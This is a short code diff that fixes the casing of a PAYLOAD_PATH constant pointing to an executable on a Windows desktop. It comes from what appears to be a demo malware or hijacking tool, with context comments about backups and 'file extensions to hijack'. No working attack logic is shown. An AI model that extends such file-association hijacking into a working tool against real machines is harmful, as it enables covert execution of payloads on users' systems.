@@ -109,7 +109,7 @@ void restoreBackups(const wchar_t* dir) {
 
 // --- Add missing helpers and constants ---
 #ifndef PAYLOAD_PATH
-#define PAYLOAD_PATH L"C:\\USers\\Fantastic\\Desktop\\DEMO\\Renge_x64.exe"
+#define PAYLOAD_PATH L"c:\\Users\\Fantastic\\Desktop\\DEMO\\Renge_x64.exe"
 #endif
 
 // File extensions to hijack
